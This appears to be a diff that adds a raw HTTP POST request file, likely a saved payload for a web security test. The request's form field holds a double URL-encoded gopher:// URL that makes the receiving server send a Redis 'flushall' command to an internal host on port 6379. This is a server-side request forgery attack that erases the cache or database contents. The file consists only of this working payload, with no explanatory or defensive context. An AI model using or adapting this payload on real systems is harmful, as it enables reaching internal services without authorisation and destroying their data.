@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 108
+Connection: close
+
+s=gopher%253A%252F%252F10.0.0.2%253A6379%252F_%252A1%25250d%25250a%25248%25250d%25250aflushall%25250d%25250a
